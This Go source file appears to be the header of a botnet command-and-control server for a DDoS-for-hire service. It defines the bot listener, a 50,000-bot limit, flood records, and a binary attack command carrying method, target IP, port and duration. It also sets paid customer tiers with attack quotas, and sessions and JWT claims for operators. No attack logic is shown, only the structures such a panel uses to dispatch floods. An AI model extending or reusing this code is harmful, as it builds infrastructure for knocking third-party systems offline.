package main

import (
	"net"
	"sync"
	"time"

	"github.com/golang-jwt/jwt/v4"
)

const (
	userFile = "data/json/users.json"
	rbacFile = "data/json/rbac.json"
	certPath = "data/certs/server.crt"
	keyPath  = "data/certs/server.key"
	jwtFile  = "data/certs/jwt_signing.key"
	logDir   = "data/logs"
	gifDir   = "data/gifs"
)

const (
	addrUser = "192.168.0.11:420"
	addrBot  = "192.168.0.11:7002"
	addrAPI  = "8443"
)

const (
	termCols = 82
	termRows = 26
)

const (
	maxConns   = 1000
	maxBots    = 50000
	maxSess    = 10000
	maxAuth    = 10000
	maxQuota   = 1000
	maxHist    = 10000
	maxRL      = 50000
	maxPool    = 1000
	maxFlood   = 1000
	maxAPIFlood = 1000
	maxPerIP   = 5
)

type tier int

const (
	tierOwner tier = iota
	tierAdmin
	tierPro
	tierBasic
)

type acct struct {
	Username  string    `json:"username,omitempty"`
	Password  string    `json:"password,omitempty"`
	Expire    time.Time `json:"expire"`
	Level     string    `json:"level"`
	APIToken  string    `json:"api_token,omitempty"`
	APISecret string    `json:"api_secret,omitempty"`
}

func (a *acct) lvl() tier {
	switch a.Level {
	case "Owner":
		return tierOwner
	case "Admin":
		return tierAdmin
	case "Pro":
		return tierPro
	default:
		return tierBasic
	}
}

type flood struct {
	method  string
	target  string
	port    string
	dur     time.Duration
	started time.Time
	who     string
}

type cmd struct {
	Method   [16]byte
	TargetIP [4]byte
	Port     uint16
	Duration uint32
	Pad      [16]byte
}

type sysinfo struct {
	OS     string `json:"os"`
	Arch   string `json:"arch"`
	CPU    string `json:"cpu,omitempty"`
	RAM    string `json:"ram,omitempty"`
	Uptime string `json:"uptime,omitempty"`
	Load1  string `json:"load_1,omitempty"`
	Load5  string `json:"load_5,omitempty"`
	Load15 string `json:"load_15,omitempty"`
	Disk   string `json:"disk_usage,omitempty"`
}

type node struct {
	ID       string    `json:"id"`
	IP       string    `json:"ip"`
	ConnAt   time.Time `json:"connected"`
	LastPing time.Time `json:"last_ping"`
	Status   string    `json:"status"`
	PingMs   int64     `json:"ping_ms"`
	Sys      sysinfo   `json:"system_info,omitempty"`
}

type session struct {
	ID        string    `json:"id"`
	User      acct      `json:"user"`
	IP        string    `json:"ip"`
	Agent     string    `json:"user_agent,omitempty"`
	LoginAt   time.Time `json:"login_time"`
	LastTouch time.Time `json:"last_active"`
	TTL       time.Time `json:"expires_at"`
	Token     string    `json:"token,omitempty"`
	Refresh   string    `json:"refresh_token,omitempty"`
	Revoked   bool      `json:"is_revoked"`
	JTI       string    `json:"jwt_id"`
	mu        sync.Mutex
}

type claims struct {
	SessID string `json:"session_id"`
	UID    string `json:"user_id"`
	Role   string `json:"user_level"`
	JTI    string `json:"jti"`
	jwt.RegisteredClaims
}

type loginRec struct {
	Count   int
	LastTry time.Time
	Lock    sync.Mutex
}

type qlimit struct {
	MaxConcurrent int
	MaxDaily      int
	MaxDur        time.Duration
	UsedToday     int
	ResetAt       time.Time
}

type animation struct {
	frames []string
	delay  time.Duration
}

type client struct {
	conn  net.Conn
	user  acct
	token string
	sid   string
}

func parseTier(s string) tier {
	switch s {
	case "Owner":
		return tierOwner
	case "Admin":
		return tierAdmin
	case "Pro":
		return tierPro
	default:
		return tierBasic
	}
}
